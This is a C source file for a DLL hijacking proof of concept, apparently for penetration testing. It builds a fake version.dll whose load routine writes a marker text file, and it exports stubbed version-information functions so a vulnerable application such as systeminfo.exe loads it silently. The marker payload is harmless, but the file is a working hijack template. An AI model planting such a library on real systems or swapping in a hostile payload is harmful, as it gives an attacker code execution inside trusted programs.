/*
Name        : version.c
Description : DLL Hijacking PoC that creates a file.
Compile 64  : x86_64-w64-mingw32-gcc -shared -o version.dll version.c
Compile 32  : i686-w64-mingw32-gcc -shared -o version.dll version.c
Examples    : C:\Windows\System32\systeminfo.exe (64-bit)
Author      : Lisandre.com
Date        : 2025-04-11
Prereq      : Run sigcheck from Sysinternals to know if the app is 32-bit or 64-bit
              sigcheck.exe VulnerableApp.exe
*/
#include <windows.h>
#include <stdio.h>

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        FILE* f = fopen("C:\\Users\\Public\\dllhijack.txt", "w");
        if (f != NULL) {
            fprintf(f, ">>> DLL Hijacking: It works!\n");
            fclose(f);
        }
    }
    return TRUE;
}

// Simple stubbed-out necessary functions to prevent entry point errors, return "expected" values
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoA(LPCSTR, DWORD, DWORD, LPVOID) { return TRUE; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoByHandle(HANDLE, LPVOID) { return TRUE; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoExA(DWORD, LPCSTR, DWORD, DWORD, LPVOID) { return TRUE; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoExW(DWORD, LPCWSTR, DWORD, DWORD, LPVOID) { return TRUE; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeA(LPCSTR, LPDWORD lpdwHandle) { if (lpdwHandle) *lpdwHandle = 0; return 128; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExA(DWORD, LPCSTR, LPDWORD lpdwHandle) { if (lpdwHandle) *lpdwHandle = 0; return 128; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExW(DWORD, LPCWSTR, LPDWORD lpdwHandle) { if (lpdwHandle) *lpdwHandle = 0; return 128; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeW(LPCWSTR, LPDWORD lpdwHandle) { if (lpdwHandle) *lpdwHandle = 0; return 128; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoW(LPCWSTR, DWORD, DWORD, LPVOID) { return TRUE; }

__declspec(dllexport) DWORD WINAPI VerLanguageNameA(DWORD, LPSTR, DWORD) { return 0; }
__declspec(dllexport) DWORD WINAPI VerLanguageNameW(DWORD, LPWSTR, DWORD) { return 0; }
__declspec(dllexport) BOOL WINAPI VerQueryValueA(LPCVOID, LPCSTR, LPVOID* lpBuffer, PUINT puLen) {
    if (lpBuffer) *lpBuffer = (LPVOID)"FakeData";
    if (puLen) *puLen = 8;
    return TRUE;
}
__declspec(dllexport) BOOL WINAPI VerQueryValueW(LPCVOID, LPCWSTR, LPVOID* lpBuffer, PUINT puLen) {
    if (lpBuffer) *lpBuffer = (LPVOID)L"FakeData";
    if (puLen) *puLen = 8;
    return TRUE;
}
